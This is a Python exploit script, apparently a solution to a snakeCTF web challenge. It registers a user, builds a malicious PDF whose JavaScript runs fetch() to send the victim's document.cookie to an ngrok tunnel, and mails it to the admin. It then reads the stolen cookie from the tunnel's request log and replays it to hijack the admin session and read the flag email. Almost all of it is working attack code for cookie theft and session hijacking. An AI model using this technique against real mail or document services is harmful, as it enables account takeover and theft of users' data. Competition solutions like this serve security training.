#!/usr/bin/env python3

from malpdf import generate_payload
from pyngrok import conf, ngrok
from bs4 import BeautifulSoup
from time import sleep
import requests
import urllib3
import random
import string
import json
import sys
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PORT = 5000

if len(sys.argv) == 1:
    print(f"Usage: {sys.argv[0]} https://url.for.challenge.tld")
    exit(1)
url = sys.argv[1]

def generate_random_username(length=10):
    username = ''.join(random.choices(
        string.ascii_lowercase + string.digits, k=length))
    return username

pyngrok_config = conf.PyngrokConfig(ngrok_path=None, config_path=None, auth_token=None, region=None, monitor_thread=True, log_event_callback=None,
                                    startup_timeout=15, max_logs=100, request_timeout=4, start_new_session=False, ngrok_version='v3', api_key=None)
conf.set_default(pyngrok_config)
n = ngrok.connect(PORT)

s = requests.Session()
s.verify = False

response = s.post(
    url + "/api/auth/signup",
    json={
        "username": generate_random_username(),
        "password": "testtest",
        "passwordConfirm": "testtest"
    }
)
set_cookie = response.headers.get('Set-Cookie')

jspayload = f"fetch('{n.public_url}?cookie=' + document.cookie)"
payload = generate_payload(jspayload)
with open("poc.pdf", "w") as f:
        f.write(payload)

response = s.post(
    url + "/api/email",
    headers={
        "Cookie": set_cookie,
    },
    files = {
        "subject": (None, "test"),
        "recipient": (None, "admin@mail.snakectf.org"),
        "body": (None, "test"),
        "snakeify": (None, "false"),
        "readReceipt": (None, "false"),
        "attachments": ("poc.pdf", open("poc.pdf", "rb"), "application/pdf"),
    }
)

os.remove("poc.pdf")

run = 0
while run < 4:
    sleep(5)
    API_URL = "http://localhost:4040/api/requests/http"
    response = s.get(API_URL).json()
    if len(response["requests"]) > 0:
        cookie = response["requests"][0]["request"]["uri"].replace(
            "/?cookie=", "")
        response = s.get(url + "/app", headers={
            "Cookie": cookie
        })
        soup = BeautifulSoup(response.text, "html.parser")
        next_props = soup.find("script", id="__NEXT_DATA__").string
        next_data = json.loads(next_props)
        props = next_data.get("props", {})
        
        for email in props.get("pageProps", {}).get("emailsFor", []):
            if email.get("sender", "") == "flagteam@mail.snakectf.org":
                response = s.get(url + f"/api/email?id={email.get("id", "")}", headers={ "Cookie": cookie })
                body = response.json().get("email", "").get("body", "")

                if "snakeCTF{" in body:
                    flag = body.split("snakeCTF{")[1].split("}")[0]
                    print(f"snakeCTF{{{flag}}}")
        exit(0)
    run += 1
print("no flag :-(")